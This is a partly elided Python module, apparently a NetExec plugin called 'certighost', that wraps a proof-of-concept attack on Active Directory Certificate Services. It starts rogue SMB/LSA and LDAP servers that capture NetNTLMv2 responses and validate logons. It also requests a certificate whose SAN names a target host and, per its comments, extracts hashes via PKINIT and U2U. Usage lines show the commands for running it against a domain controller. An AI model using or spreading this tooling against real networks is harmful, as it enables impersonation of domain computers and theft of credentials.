...
# CA cert request, PKINIT+U2U hash extraction) is the PoC's own protocol code, largely
# unchanged since it is delicate and already validated standalone.
import logging
import os
import random
import secrets
...
def _error_name(code):
    try:
        ...
        return None
    for table, label in ((nt_errors.ERROR_MESSAGES, "NTSTATUS"),
                         (system_errors.ERROR_MESSAGES, "Win32")):
        if value in table:
            entry = table[value]
...
def _thread_entry(stage, target, *args):
    ...
    try:
        ...
        print(f"[!] {stage} failed: {exc}", file=sys.stderr, flush=True)
...
class NLOracle:
    ...
    def validate(self, blob, challenge):
        ...
        _debug(f"Netlogon: validating {ident['LogonDomainName']}\\{ident['UserName']} "
...
def _patch_smb():
    ...
    if hasattr(smbserver, "NetLogon"):
        ...
        def _fixed_logon(self, authenticateMessage, serverChallenge):
            ...
            ident["Workstation"] = ""
            _debug(f"Rogue SMB NetLogon: validating {ident['LogonDomainName']}\\{ident['UserName']} "
                   f"(ParameterControl=0x{int(ident['ParameterControl']):x})")
...
def run_lsa(bind, port, nb, dns, forest, guid_le, sid_s, cname, chash, cpass, cdom, dcip):
    if not hasattr(smbserver, "NetLogon"):
        _debug("Rogue LSA/SMB preflight: installed Impacket lacks smbserver.NetLogon; "
...
def request_cert(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
    ...
    _debug(f"CA request: authority={ca_name!r}, endpoint={ca_ip}, template={template!r}, "
           f"cdc={attacker_ip}, rmd={rmd_value!r}")
    ...
    csr = (x509.CertificateSigningRequestBuilder()
           ...
           .add_extension(x509.SubjectAlternativeName([x509.DNSName(rmd_value)]), critical=False)
           .sign(key, hashes.SHA256()))
    csr_der = csr.public_bytes(Encoding.DER)
    attrs = [f"CertificateTemplate:{template}", f"SAN:dns={rmd_value}",
    ...
    if disp != 3:
        ...
        if (int(disp) & 0xFFFFFFFF) == 0x800706BA:
            _debug("CA RPC: in the observed cdc chase, 0x800706ba was a wrapper for a "
                   "CA-side callback failure; inspect the rogue SMB/LDAP and Netlogon "
                   "diagnostics for the underlying protocol error")
...
class NXCModule:
    ...
    def options(self, context, module_options):
        ...
        DEBUG           Show protocol stages, decoded NT/HRESULT errors and full tracebacks

        Usage:
            nxc ldap $DC -u user -p pass -M certighost
            nxc ldap $DC -u user -p pass -M certighost -o TEMPLATE=Machine DEBUG=true
        """
        ...
        self.debug = "DEBUG" in module_options

    def on_login(self, context, connection):
        global DEBUG
        DEBUG = self.debug

        # Silence impacket's rogue-server INFO chatter (which includes captured
        # NetNTLMv2 challenge-responses from smbserver) unless DEBUG=true.
        lvl = logging.DEBUG if self.debug else logging.CRITICAL
        for ln in ("impacket", "impacket.smbserver", "impacket.dcerpc",
                   "impacket.ntlm", "rogue_lsa", "rogue_ldap"):
        ...
        try:
            ...
            threading.Thread(target=_thread_entry, daemon=True,
                args=("Rogue LSA/SMB server", run_lsa, "0.0.0.0", 445, nb, domain, domain,
                      guid_le, domain_sid, comp_name, comp_hash, comp_pass, domain, dc_ip)).start()

            ldap_srv = RogueLDAP(domain, nb, comp_name, comp_hash, domain, dc_ip,
                                  target_sid_bin, target_dns, target_name.rstrip("$"), target_name)
            threading.Thread(target=_thread_entry, daemon=True,
                args=("Rogue LDAP server", ldap_srv.serve, "0.0.0.0", 389)).start()
            ...
            pfx_data = request_cert(ca_ip, ca_name, domain, comp_name, comp_hash,
                                    dc_ip, atk_ip, target_dns, self.template)
